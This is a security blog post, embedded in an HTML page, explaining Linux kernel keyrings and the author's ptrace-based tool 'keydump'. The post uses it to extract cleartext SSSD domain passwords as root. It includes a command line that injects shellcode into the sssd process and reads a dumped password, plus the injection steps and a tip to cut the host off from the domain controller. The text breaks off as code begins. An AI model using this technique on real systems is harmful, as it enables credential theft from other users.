@@ -1,0 +1,1360 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Keyrings dump with keydump: Extracting SSSD cleartext credentials - Hackliza</title>
+  <meta name="description" content="Hi there!!
+ Time ago I was tinkered with Linux keyrings to extract Kerberos tickets from keys with tickey, and recently I was involved in a new interesting project in which I needed to learn again about this topic, so I will try to describe the important points here in case my future self or anyone else want to learn them.
+ First we need to know is that Linux keyrings is a key management facility."><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Hackliza",
+    
+    "url": "https:\/\/hackliza.gal\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/hackliza.gal\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/hackliza.gal\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/hackliza.gal\/en\/posts\/keydump\/",
+          "name": "Keyrings dump with keydump extracting s s s d cleartext credentials"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "Eloy Pérez González"
+  },
+  "headline": "Keyrings dump with keydump: Extracting SSSD cleartext credentials",
+  "description" : "Hi there!!\n Time ago I was tinkered with Linux keyrings to extract Kerberos tickets from keys with tickey, and recently I was involved in a new interesting project in which I needed to learn again about this topic, so I will try to describe the important points here in case my future self or anyone else want to learn them.\n First we need to know is that Linux keyrings is a key management facility.",
+  "inLanguage" : "en",
+  "wordCount":  5056 ,
+  "datePublished" : "2024-09-08T00:00:00",
+  "dateModified" : "2024-09-08T00:00:00",
+  "image" : "https:\/\/hackliza.gal\/img\/hackliza.png",
+  "keywords" : [ "Linux, Keyrings, sssd" ],
+  "mainEntityOfPage" : "https:\/\/hackliza.gal\/en\/posts\/keydump\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/hackliza.gal\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/hackliza.gal\/img\/hackliza.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="Keyrings dump with keydump: Extracting SSSD cleartext credentials" />
+<meta property="og:description" content="Hi there!!
+ Time ago I was tinkered with Linux keyrings to extract Kerberos tickets from keys with tickey, and recently I was involved in a new interesting project in which I needed to learn again about this topic, so I will try to describe the important points here in case my future self or anyone else want to learn them.
+ First we need to know is that Linux keyrings is a key management facility.">
+<meta property="og:image" content="https://hackliza.gal/img/hackliza.png" />
+<meta property="og:url" content="https://hackliza.gal/en/posts/keydump/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Hackliza" />
+
+  <meta name="twitter:title" content="Keyrings dump with keydump: Extracting SSSD cleartext credentials" />
+  <meta name="twitter:description" content="Hi there!!
+ Time ago I was tinkered with Linux keyrings to extract Kerberos tickets from keys with tickey, and recently I was involved in a new interesting project in which I needed to learn again …">
+  <meta name="twitter:image" content="https://hackliza.gal/img/hackliza.png" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@hackliza" />
+  <meta name="twitter:creator" content="@hackliza" />
+  <link href='https://hackliza.gal/img/hackliza.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.74.3" />
+  <link rel="alternate" href="https://hackliza.gal/en/index.xml" type="application/rss+xml" title="Hackliza"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://hackliza.gal/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://hackliza.gal/css/syntax.css" /><link rel="stylesheet" href="https://hackliza.gal/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous"><style>
+ nav {
+     background: #0099CC !important;
+ }
+
+ .navbar-brand, #main-navbar ul li a, footer {
+     color: #fff !important;
+ }
+
+ .navbar-brand:hover, #main-navbar ul li a:hover {
+     color: #ccc !important;
+ }
+
+
+ figure {
+     margin-top: 1.5em; 
+     margin-bottom: 1.5em; 
+ }
+ 
+ figcaption {
+     text-align: center;
+     font-size: 85%;
+ }
+
+ pre {
+     overflow-x: auto !important;
+ }
+
+ .posts-heading {
+     text-align: center;
+ }
+ 
+</style>
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://hackliza.gal/en/">Hackliza</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="/en/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="/en/about/">About</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Talks" href="/en/talks/">Talks</a>
+            </li>
+          
+        
+
+        
+          
+            <li>
+              
+                
+              
+                
+                  <a href="/gl" lang="gl">gl</a>
+                
+              
+            </li>
+          
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Hackliza" href="https://hackliza.gal/en/">
+            <img class="avatar-img" src="https://hackliza.gal/img/hackliza.png" alt="Hackliza" />
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="posts-heading">
+              
+                <h1>Keyrings dump with keydump: Extracting SSSD cleartext credentials</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        
+<p>
+Hi there!!</p>
+<p>
+Time ago I was tinkered with Linux <a href="https://www.man7.org/linux/man-pages/man7/keyrings.7.html">keyrings</a> to extract Kerberos tickets from
+keys with <a href="https://github.com/zer1t0/tickey">tickey</a>, and recently I was involved in a new interesting project in
+which I needed to learn again about this topic, so I will try to describe the
+important points here in case my future self or anyone else want to learn them.</p>
+<p>
+First we need to know is that Linux keyrings is a key management facility. The
+keys are entities that can be used by programs to store secrets, like passwords
+or certificates, in a secure way, preventing other programs or users from
+accessing them.</p>
+<p>
+This been said, let&#39;s go to the topic!</p>
+<div id="outline-container-the-beginning" class="outline-2">
+<h2 id="the-beginning">
+The beginning
+</h2>
+<div id="outline-text-the-beginning" class="outline-text-2">
+<p>
+I was experimenting a little with sssd after reading about <a href="https://github.com/CiscoCXSecurity/linikatz">linikatz</a>
+and then I found the following NOTE in the <code>krb5_store_password_if_offline</code>
+option of the <a href="https://linux.die.net/man/5/sssd-krb5">sssd-krb5</a> documentation:</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">krb5_store_password_if_offline (boolean)
+    Store the password of the user if the provider is offline and use it to request a TGT when
+    the provider comes online again.
+
+    NOTE: this feature is only available on Linux. Passwords stored in this way are kept in
+    plaintext in the kernel keyring and are potentially accessible by the root user (with
+    difficulty).
+
+    Default: false</code></pre></div>
+</div>
+<p>
+There are a few points here I would to discuss:</p>
+<p>
+First, and maybe the more important part is that <strong>passwords are stored in
+plaintext</strong> in a kernel keyring. The documentation also points that this could be
+accessible by root <span style="text-decoration: underline;">with difficulty</span>. But, what is difficulty? In my mind it
+just means that a tool doesn&#39;t exists to do the job yet, so that is what I did.</p>
+<p>
+Another important fact is that passwords are only stored <strong><strong>when the provider is
+offline</strong></strong>. In a common Active Directory (AD) scenario, this means that passwords
+are only stored when the Domain Controller (DC) cannot be reached, therefore
+making the attack less exploitable. However in case we are root of a machine, we
+could force the machine to lost connection with the Domain Controller by
+applying a firewall rule, for example, so we can collect the passwords of new
+users that logs in the machine. However, for this purposes, maybe creating a fake PAM
+module could be easier and more relayable approach. All this been said, I did it
+anyway for the fun of a challenge.</p>
+<p>
+And last but not least, the default value of <code>krb5_store_password_if_offline</code> is
+<code>false</code>. Which means that in absense of this option passwords are not
+stored. However, by default <a href="https://linux.die.net/man/8/sssd">sssd</a> sets this option to <code>true</code>, so no problem at
+all.</p>
+<p>
+Therefore, in order to extract the credentials, I required a tool able to
+extract keyrings from other processes keyrings. As I said before, I did this in
+the past by creating <a href="https://github.com/zer1t0/tickey">tickey</a>, but that tool was too focused on the kerberos
+tickets. So I thought that I had to create a more generic tool to dump all the
+keys of any process (or thread) keyrings, no matter the purpose.</p>
+<p>
+That is how <a href="https://github.com/zer1t0/keydump">keydump</a><sup class="footnote-reference"><a id="footnote-reference-1" href="#footnote-1">1</a></sup> was born. So in this post I will try to explain the concepts
+behind keydump so we can understand its functionality.</p>
+<p>
+However, for those who are impatient, here is a preview of the keydump output
+dumping a password stored by sssd process: </p>
+<figure>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ ps -o pid --no-headers -C sssd | sed &#39;s/ //g&#39; | sudo ./keydump -
+[PID 452] Shellcode injected
+[PID 452] /tmp/k_452 exists, so keys must be dumped!!
+$ sudo cat /tmp/k_452/210e3b29_user_Administrator_dev_lab__10
+S3cur3p4ss</code></pre></div>
+</div>
+<figcaption>
+Dumping sssd passwords with keydump
+</figcaption>
+</figure>
+</div>
+</div>
+<div id="outline-container-the-problem" class="outline-2">
+<h2 id="the-problem">
+The problem
+</h2>
+<div id="outline-text-the-problem" class="outline-text-2">
+<p>
+So we want to dump the keys of other processes? The problem is that keys are
+designed to avoid that.</p>
+<p>
+Keys can be created with permissions that will allow the only process (or even
+thread) which creates the key to read it. In the case of sssd, we can see how
+the key is created in the following line of the
+<a href="https://github.com/SSSD/sssd/blob/077d2993a1b306e7cfe61618cbd5d03c602572f8/src/providers/krb5/krb5_delayed_online_authentication.c#L287">add_user_to_delayed_online_authentication</a> function:</p>
+<figure>
+<div class="src src-c">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    new_pd<span style="color:#f92672">-&gt;</span>key_serial <span style="color:#f92672">=</span> add_key(<span style="color:#e6db74">&#34;user&#34;</span>, new_pd<span style="color:#f92672">-&gt;</span>user, password, len,
+                                 KEY_SPEC_SESSION_KEYRING);</code></pre></div>
+</div>
+<figcaption>
+sssd code to store a password into a key
+</figcaption>
+</figure>
+<p>
+To clarify, sssd is using a key that can only be accessed by processes its
+current session (not a login session, but a <a href="https://www.informit.com/articles/article.aspx?p=397655&amp;seqNum=6">process session</a> created with
+<a href="https://www.man7.org/linux/man-pages/man2/setsid.2.html">setsid</a>). Hence, we could the follow a similar approach to the one I used with
+<a href="https://github.com/zer1t0/tickey">tickey</a>, by injecting a new process into that session by attaching us to ssdd
+with <a href="https://www.man7.org/linux/man-pages/man2/ptrace.2.html">ptrace</a> and forcing it to <a href="https://www.man7.org/linux/man-pages/man2/fork.2.html">fork</a> into a new process that will dump the keys
+for us. However, in this occasion my approach will be to try to dump the keys
+from the sssd process itself for several reasons:</p>
+<ul>
+<li>
+<p>Maybe in the future this is key is modified to only allow access from the same
+process.</p>
+</li>
+<li>
+<p>Extracting from the process itself will allow to reuse the tool to other
+programs that only allow the same process to read the key.</p>
+</li>
+<li>
+<p>And the real reason, I wanted to do it that way, and know if I could do it by
+injecting a shellcode based in my <a href="https://github.com/zer1t0/shellnova">shellnova</a> project.</p>
+</li>
+</ul>
+<p>So let&#39;s see how this can be done.</p>
+<blockquote>
+<p>I would like you to notice that in Linux, threads are implemented as lightweight
+processes, and therefore each thread can have its own set of credentials. That
+is the reason threads can have keys that are only accessed by themselves.</p>
+<p>
+This also means that injecting code in a thread is the same as injecting it
+into a process, we just need to specify the TID (Thread ID) instead of PID in
+the <code>ptrace</code> syscall. In fact, when we specify the PID, we are just specifying
+the TID of the process main thread.</p>
+</blockquote>
+</div>
+</div>
+<div id="outline-container-keyrings" class="outline-2">
+<h2 id="keyrings">
+Keyrings
+</h2>
+<div id="outline-text-keyrings" class="outline-text-2">
+<p>
+First we need to know how to dump keys from a process. As I have mentioned,
+keys are stored in kernel memory. In this section I will try to describe all the
+relevant points for our purpose, but you can find more information on the
+<a href="https://www.man7.org/linux/man-pages/man7/keyrings.7.html">keyrings manual page</a>.</p>
+<blockquote>
+<p>Note that Linux keyrings are not the only keyring solution, but there are many
+others like <a href="https://wiki.gnome.org/Projects/GnomeKeyring/">GNOME Keyring</a>, that aren&#39;t managed by the Linux kernel.</p>
+</blockquote>
+<p>
+In order to read the contents of a key, we need to know its key ID, since it
+is required to perform the <code>KEYCTL_READ</code> operation of the <a href="https://www.man7.org/linux/man-pages/man2/keyctl.2.html">keyctl syscall</a>. In our
+case, we want to read all the keys a process can access, so how do we get their
+IDs?</p>
+<div id="outline-container-the-proc-keys-file" class="outline-3">
+<h3 id="the-proc-keys-file">
+The /proc/keys file
+</h3>
+<div id="outline-text-the-proc-keys-file" class="outline-text-3">
+<p>
+Well, we just need to read the <code class="verbatim">/proc/keys</code> file, which is a pseudo-file in the
+<a href="https://www.man7.org/linux/man-pages/man5/proc.5.html">proc filesystem</a> that returns the available keys for the process that reads
+it. Here is an example:</p>
+<figure>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ cat /proc/keys
+00c58dad I--Q---    58 perm 3f030000  1000  1000 keyring   _ses: 1
+0ae2c7d1 I--Q---     1 perm 3f010000  1000  1000 user      user_secret: 6
+102e811f I--Q---   104 perm 3f030000  1000  1000 keyring   _ses: 2
+244b527f I--Q---     4 perm 1f3f0000  1000 65534 keyring   _uid.1000: empty
+2729088e I--Q---     1 perm 1f3f0000  1000 65534 keyring   _uid_ses.1000: 1</code></pre></div>
+</div>
+<figcaption>
+Available keys for the cat process
+</figcaption>
+</figure>
+<p>
+As we can appreciate, there is a line per key, a very common format in the Unix
+world. In each line we have several fields that describe a key. Let&#39;s review
+them to properly understand them.</p>
+<p>
+In the first field we have the <strong>key ID</strong>, or serial number, that uniquely
+identifies the key. This is the main piece of information we want to retrieve to
+read the key contents, but let&#39;s also understand the other fields.</p>
+<p>
+The second field indicates <strong>state flags</strong> related to the keys. Here we need to
+check that the key we want to read have the <code>I</code> flag, which means the key is
+instanciate, that is, that the key has been created. This may sound weird, since
+all the keys should be created to exists right? However keys can also be
+requested and created by a third party, as described in <a href="https://www.man7.org/linux/man-pages/man2/request_key.2.html">request_key(2)</a>, and
+being in under construction state, indicated by the <code>U</code> flag.</p>
+<p>
+The third field, known as <strong>usage</strong>, indicates how many links point to the key. A
+key can be pointed by a keyring, that is an special type of key that keeps links
+that point to other keys, like a folder. If a key, even a keyring, lost all its
+references, it is deleted. Due to this some keyrings, the anchor keyrings,
+require a reference from kernel structures.</p>
+<p>
+The fourth field is the <strong>key timeout</strong>, and <code>perm</code> (permanent) keyword is
+used to indicate that the key don&#39;t expire. An expired key cannot be used and it
+will be deleted.</p>
+<p>
+The fifth field are the <strong>permissions</strong>, with four permission sets, a byte
+per set (two hexadecimal digits), that refers to the possessor process or
+thread, user, group and other permissions. The last 3 are similar to file
+permissions sets, but the possessor set is more complicated and requires further
+explanation, which I will provide below. Moreover, the permissions are different
+than the ones of a file, and will also be explained below.</p>
+<p>
+Then we have the <strong>user and group</strong> ids of the key, that identifies the user and
+group owner of a key (that is not the same as the possessor). A value of 65534
+(-1 in signed integer) in the group field means the key has no group.</p>
+<p>
+The eighth field is the <strong>key type</strong>. There are several types of keys with
+different characteristics, some of them even don&#39;t support the read operation so
+its content cannot be retrieved (from userspace at least). Common types of
+keys are the following:</p>
+<ul>
+<li>
+<p><strong>user</strong> : A generic key that allows to store secrets completely in kernel
+memory (payload up to 32767 bytes) and retrieve them from userspace.</p>
+</li>
+<li>
+<p><strong>keyring</strong> : Contains links to other keys (even other keyrings). This is a very
+special key type since works like a &#34;directory&#34; that allows keys to become
+searchable by description.</p>
+</li>
+<li>
+<p><strong>logon</strong> : Like user type, but it doesn&#39;t allow read the secret payload from
+user space.</p>
+</li>
+<li>
+<p><strong>big_key</strong> : Like user type, but it allows bigger secrets to be stored (up to
+1 MiB). Therefore big keys may be stored encrypted in a tmpfs filesystem.</p>
+</li>
+<li>
+<p><a href="https://docs.kernel.org/crypto/asymmetric-keys.html"><strong>asymmetric</strong></a> : Allows to store public and private key pairs, or just public.
+It doesn&#39;t allow reading the payload from userspace, but it provides
+operations for encrypt, decrypt, sign and verify signature.</p>
+</li>
+</ul>
+<p>There are many more key types (like <a href="https://github.com/torvalds/linux/blob/bfa8f18691ed2e978e4dd51190569c434f93e268/certs/blacklist.c#L138">blacklist</a>, <a href="https://github.com/torvalds/linux/blob/bfa8f18691ed2e978e4dd51190569c434f93e268/crypto/asymmetric_keys/pkcs7_key_type.c#L70">pkcs7</a>, <a href="https://github.com/torvalds/linux/blob/bfa8f18691ed2e978e4dd51190569c434f93e268/fs/crypto/keyring.c#L173">.fscrypt</a>, etc) that I do
+not list here cause I don&#39;t know its purpose, but in case you are curious, you
+can discover them by searching for the use of the &#34;register_key_type&#34; function
+in <a href="https://github.com/torvalds/linux">Linux kernel source code</a>.</p>
+<p>
+The final field is composed by two fields, the <strong>name or description</strong> of the key,
+which can be used to search for the key in the keyrings, and some <strong>metadata</strong>
+whose information varies between different types of keys, for example, in the
+case of keyrings the metadata shows the number of links contained in them and
+in the case of user keys, it indicates their size in bytes.</p>
+<p>
+With the information we extract from the <code>/proc/keys</code> file we are good to go and
+try to dump all the keys. My approach in this case was to just read
+<code>/proc/keys</code> and try to dump all the keys listed, which is quite easier than
+trying to read the permissions and guess which keys can be dumped.</p>
+</div>
+</div>
+<div id="outline-container-the-keys-permissions" class="outline-3">
+<h3 id="the-keys-permissions">
+The keys permissions
+</h3>
+<div id="outline-text-the-keys-permissions" class="outline-text-3">
+<p>
+Notwithstanding, while I think a brute-force approach is a good decision for
+reading keys of a process, if we want to read an specific key, trying to inject
+in all the processes (and threads) of the system until we read it may not be a
+good option, so being able to understand the permissions of a key may
+facilitate us to know what process infect.</p>
+<p>
+As we have say previously, the permissions are formed by four sets, and for each
+set we have the following permissions:</p>
+<ul>
+<li>
+<p><strong>view</strong> (0x01): Allows to read the key attributes. The keys for which the
+process has view permissions are the ones listed in <code>/proc/keys</code>.</p>
+</li>
+<li>
+<p><strong>read</strong> (0x02): Allows to read the payload. However, some key types such as
+&#34;logon&#34; and &#34;asymmetric&#34; don&#39;t support the read operation.</p>
+</li>
+<li>
+<p><strong>write</strong> (0x04): Allows to update the payload and revoke the key.</p>
+</li>
+<li>
+<p><strong>search</strong> (0x08): Allows the key to be found by a search, that is looking
+for a key through the keyrings by its type and description/name.</p>
+</li>
+<li>
+<p><strong>link</strong> (0x10): Allows to create new links that point to the key.</p>
+</li>
+<li>
+<p><strong>setattr</strong> (0x20): Allows to revoke the key, update the permissions mask
+and the uid (user id) and gid (group id), setting a key timeout and apply a
+restrictions to keyrings (implies that keys added to them must be signed).</p>
+</li>
+</ul>
+<p>Moreover, the four permissions sets are possessor, user, group and others. As we
+imagine, the user and group apply to the key user and group owners, and the
+other to any other user. </p>
+<p>
+Let&#39;s see an example of a <code>/proc/keys</code> line:</p>
+<figure>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">0ae2c7d1 I--Q---     1 perm 3f010000  1000  1000 user      user_secret: 6</code></pre></div>
+</div>
+<figcaption>
+
+</figcaption>
+</figure>
+<p>
+We can see that permissions for the <code>user_secret</code> key are <code>3f010000</code>, which
+means that all the permissions are granted to the possessor, just view
+permissions to the user and no permissions for group or others.</p>
+<p>
+Besides, we must keep in mind that, the same as files, the <strong>user, group and
+others permissions are exclusive</strong>, this means that if the user of the process
+trying to access the key match with the user key, the user permissions will be
+applied, and no group or other permissions, even if these (for some curious
+reason) are more permissive than those of the user. Same caso for group
+permissions. And in case there is no match for process user or groups, then the
+other permissions will apply.</p>
+<p>
+On the other hand we have the <strong>possessor permissions</strong>, which are quite important
+cause generally the possessors are granted the highest privileges in a key. But
+possessor permissions are different in several aspects:</p>
+<ul>
+<li>
+<p><strong>Are inclusive</strong>: Possessor permissions are applied together with the one of
+other three permissions sets that applies. This means that if, for example,
+a process can be applied both user and possessor permissions and the user
+permissions only allow to read a key, and the possessor permissions only allow
+to write the key, the process can both read and write.</p>
+</li>
+<li>
+<p><strong>Are dynamic</strong>: Possessor permissions are applied only if a key is possessed by
+the current process (or thread), and key possession is calculated each time
+the key is accessed.</p>
+</li>
+</ul>
+<p>So, how can we know if a key is possessed by a process? We need to follow the links
+from the anchor keyrings.</p>
+<p>
+Wonderful, that reveals another question, <strong>what are the anchor keyrings?</strong> If you
+recall, I have said that every key, even keyrings, needs to be referenced at
+least once in order to not be deleted by the kernel. In fact, each time a key is
+created (with <a href="https://www.man7.org/linux/man-pages/man2/add_key.2.html">add_key</a> syscall) a keyring must be specified to contain a link to
+that key (same situation in files, as each one must be created under a
+folder). Now imagine we want to create our first keyring which will hold links
+to all our keys, what keyring will point to our first keyring? The answer is an
+<a href="https://man.archlinux.org/man/keyrings.7.en#Anchoring_keys">anchor keyring</a>. <strong>Anchor keyrings are special keyrings linked by kernel
+structs</strong>. And there are several, that in conjunction with the key possession,
+allows keys to only be accessed from specific scopes.</p>
+<p>
+These are the available anchor keyrings (that are generally created by the
+kernel when they are accessed):</p>
+<ul>
+<li>
+<p><strong>Process keyrings</strong>: These keyrings are linked to the process
+credentials. There are three of them with different scopes:</p>
+<ul>
+<li>
+<p><a href="https://www.man7.org/linux/man-pages/man7/thread-keyring.7.html">thread-keyring</a>: Only can be accessed by the current thread. It has the name
+<em>_tid</em>.</p>
+</li>
+<li>
+<p><a href="https://www.man7.org/linux/man-pages/man7/process-keyring.7.html">process-keyring</a>: Can be accessed by all the threads of the current
+process. It has the name <em>_pid</em>.</p>
+</li>
+<li>
+<p><a href="https://www.man7.org/linux/man-pages/man7/session-keyring.7.html">session-keyring</a>: Can be accessed by all the processes in the current login
+session (since it is created by <a href="https://linux.die.net/man/8/pam">PAM</a>). It has the name <em>_ses</em>.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>User keyrings</strong>: This keyrings are tied to kernel user structures, so they
+only can be used while the user has an active session.</p>
+<ul>
+<li>
+<p><a href="https://man7.org/linux/man-pages/man7/user-keyring.7.html">user-keyring</a>: Can be accessed by all the processes of the user. It has the
+name <em>_uid.&lt;uid&gt;</em> where &lt;uid&gt; is replaced by the user uid.</p>
+</li>
+<li>
+<p><a href="https://man7.org/linux/man-pages/man7/user-session-keyring.7.html">user-session-keyring</a>: Can be accessed by all the processes of the user and
+it is used in case the session keyring is not created. It has the name
+<em>_uid_ses.&lt;uid&gt;</em> where &lt;uid&gt; is replaced by the user uid.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="https://man7.org/linux/man-pages/man7/persistent-keyring.7.html">Persistent keyring</a>: Can be accessed by all processes of the user, but it is
+not destroyec when the user logs out, so it is intended to be accessed by
+background services that acts on behalf on an user. It has an expiration
+timeout, so if its not used in a while it is deleted. It has the name
+<em>_persistent.&lt;uid&gt;</em> where &lt;uid&gt; is replaced by the user uid.</p>
+</li>
+</ul>
+<p>So these are the anchor keyrings we have in a system. They are similar to a root
+directory in a filesystem, specially the process keyrings, that are the ones
+used in possession.</p>
+<p>
+So <strong>what it is possession</strong>? and how is calculated? The answer is that a key is
+possessed when it is granted <em>search</em> permission and can be accessed by
+traversing down the keyrings links starting by the thread-keyring,
+process-keyring, or session-keyring. You can check the algorithm in
+<a href="https://man.archlinux.org/man/keyrings.7.en#Possession">Possession section of keyrings(7)</a>.</p>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-about-keydump" class="outline-2">
+<h2 id="about-keydump">
+About keydump
+</h2>
+<div id="outline-text-about-keydump" class="outline-text-2">
+<p>
+So, now we know what keys are and we are aware that some keys are only
+accessible by a process or thread, we need a way to extract them. I can think of
+two possibilities:</p>
+<ul>
+<li>
+<p>Executing some code in the context of the process (or thread) with access to a
+target key.</p>
+</li>
+<li>
+<p>Reading the keys with a Linux module from kernel space.</p>
+</li>
+</ul>
+<p>I choose the first option since it was easier to me cause I&#39;m not familiar with
+Linux modules programming (but it is a nice project for the future).</p>
+<p>
+Therefore, to execute some code in other process we can act as a debugger and
+inject a shellcode into that process. I&#39;m assuming we have root privileges, so
+we can trace any process with the <a href="https://www.man7.org/linux/man-pages/man2/ptrace.2.html">ptrace</a> syscall (unles the system is hardened).</p>
+<div id="outline-container-the-injection" class="outline-3">
+<h3 id="the-injection">
+The injection
+</h3>
+<div id="outline-text-the-injection" class="outline-text-3">
+<p>
+How we can perform a <a href="https://blog.f0b.org/2022/05/process-injection-on-linux-injecting-into-processes/">code injection with ptrace</a><sup class="footnote-reference"><a id="footnote-reference-2" href="#footnote-2">2</a></sup>?
+Basically, these are the steps I follow in keydump for injection a shellcode
+into a target process:</p>
+<ol>
+<li>
+<p>Attach to the target process</p>
+</li>
+<li>
+<p>Look for a syscall instruction</p>
+</li>
+<li>
+<p>Execute mmap to allocate memory for the shellcode</p>
+</li>
+<li>
+<p>Copy the shellcode into remote process memory</p>
+</li>
+<li>
+<p>Call the shellcode</p>
+</li>
+</ol>
+<p>These steps can be found in the <a href="https://github.com/zer1t0/keydump/blob/1c0a26a959b4409865a511a5549e1eaad3d3d6d8/src/main.rs#L92">dump_remote_process_keys function of
+keydump</a>. And for each one here is the code and the explanation:</p>
+<div id="outline-container-1-attach-to-the-target-process" class="outline-4">
+<h4 id="1-attach-to-the-target-process">
+1. Attach to the target process
+</h4>
+<div id="outline-text-1-attach-to-the-target-process" class="outline-text-4">
+<div class="src src-rust">
